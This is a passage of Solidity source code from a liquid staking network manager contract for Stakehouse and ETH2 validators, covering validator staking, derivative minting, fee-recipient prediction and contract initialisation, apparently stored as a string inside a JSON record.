of smart wallet, dao staking fund vault and savETH vault\n            _assertEtherIsReadyForValidatorStaking(blsPubKey);\n\n            _stake(\n                _blsPublicKeyOfKnots[i],\n                _ciphertexts[i],\n                _aesEncryptorKeys[i],\n                _encryptionSignatures[i],\n                _dataRoots[i]\n            );\n\n            address representative = smartWalletRepresentative[associatedSmartWallet];\n\n            if(representative != address(0)) {\n                // unauthorize the EOA representative on the Stakehouse\n                _authorizeRepresentative(associatedSmartWallet, representative, false);\n                // make the representative dormant before unauthorizing it\n                smartWalletDormantRepresentative[associatedSmartWallet] = representative;\n                emit DormantRepresentative(associatedSmartWallet, representative);\n            }\n        }\n    }\n\n    /// @notice Anyone can call this to trigger creating a knot which will mint derivatives once the balance has been reported\n    /// @param _blsPublicKeyOfKnots List of BLS public keys registered with the network becoming knots and minting derivatives\n    /// @param _beaconChainBalanceReports List of beacon chain balance reports\n    /// @param _reportSignatures List of attestations for the beacon chain balance reports\n    function mintDerivatives(\n        bytes[] calldata _blsPublicKeyOfKnots,\n        IDataStructures.ETH2DataReport[] calldata _beaconChainBalanceReports,\n        IDataStructures.EIP712Signature[] calldata _reportSignatures\n    ) external {\n        uint256 numOfKnotsToProcess = _blsPublicKeyOfKnots.length;\n        require(numOfKnotsToProcess > 0, \"Empty array\");\n        require(numOfKnotsToProcess == _beaconChainBalanceReports.length, \"Inconsistent array lengths\");\n        require(numOfKnotsToProcess == _reportSignatures.length, \"Inconsistent array lengths\");\n\n        for (uint256 i; i < numOfKnotsToProcess; ++i) {\n            // check if BLS public key is registered and not banned\n            require(isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, \"BLS public key is banned or not a part of LSD network\");\n\n            // check that the BLS pub key has deposited lifecycle\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnots[i]) == IDataStructures.LifecycleStatus.DEPOSIT_COMPLETED,\n                \"Lifecycle status must be two\"\n            );\n\n            // The first knot will create the Stakehouse\n            if(numberOfKnots == 0) {\n                _createLSDNStakehouse(\n                    _blsPublicKeyOfKnots[i],\n                    _beaconChainBalanceReports[i],\n                    _reportSignatures[i]\n                );\n            }\n            else {\n                // join stakehouse\n                _joinLSDNStakehouse(\n                    _blsPublicKeyOfKnots[i],\n                    _beaconChainBalanceReports[i],\n                    _reportSignatures[i]\n                );\n            }\n\n            address smartWallet = smartWalletOfKnot[_blsPublicKeyOfKnots[i]];\n            stakedKnotsOfSmartWallet[smartWallet] -= 1;\n\n            if(stakedKnotsOfSmartWallet[smartWallet] == 0) {\n                _authorizeRepresentative(smartWallet, smartWalletDormantRepresentative[smartWallet], true);\n\n                // delete the dormant representative as it is set active\n                delete smartWalletDormantRepresentative[smartWallet];\n            }\n\n            // Expand the staking funds vault shares that can claim rewards\n            stakingFundsVault.updateDerivativesMinted();\n        }\n    }\n\n    receive() external payable {}\n\n    /// @notice Every liquid staking derivative network has a single fee recipient determined by its syndicate contract\n    /// @dev The syndicate contract is only deployed after the first KNOT to mint derivatives creates the network Stakehouse\n    /// @dev Because the syndicate contract for the LSDN is deployed with CREATE2, we can predict the fee recipient ahead of time\n    /// @dev This is important because node runners need to configure their nodes before or immediately after staking\n    function getNetworkFeeRecipient() external view returns (address) {\n        // Always 1 knot initially registered to the syndicate because we expand it one by one\n        return syndicateFactory.calculateSyndicateDeploymentAddress(\n            address(this),\n            address(this),\n            1\n        );\n    }\n\n    /// @dev Internal method for managing the initialization of the staking manager contract\n    function _init(\n        address _dao,\n        address _syndicateFactory,\n        address _smartWalletFactory,\n        address _lpTokenFactory,\n        address _brand,\n        address _savETHVaultDeployer,\n        address _stakingFundsVaultDeployer,\n        address _optionalGatekeeperDeployer,\n        uint256 _optionalCommission,\n        bool _deployOptionalGatekeeper,\n        string calldata _stakehouseTicker\n    ) internal {\n        require(_dao != address(0), \"Zero address\");\n        require(_syndicateFactory != address(0), \"Zero address\");\n        require(_smartWalletFactory != address(0), \"Zero address\");\n        require(_brand != address(0), \"Zero address\");\n        require(bytes(_stakehouseTicker).length >= 3, \"String must be 3-5 characters long\");\n        require(bytes(_stakehouseTicker).length <= 5, \"String must be 3-5 characters long\");\n\n        brand = _brand;\n        dao = _dao;\n        syndicateFactory = ISyndicateFactory(_syndicateFactory);\n        smartWalletFactory = IOwnableSmartWalletFactory(_smartWalletFactory);\n        stakehouseTicker = _stakehouseTicker;\n\n        _updateDAORevenueCommission(_optionalCommission);\n\n        _initStakingFundsVault(_stakingFundsVaultDeployer, _lpTokenFactory);\n        _initSavETHVault(_savETHVaultDeployer, _lpTokenFactory);\n\n        if (_deployOptionalGatekeeper)"
    }
  ]
}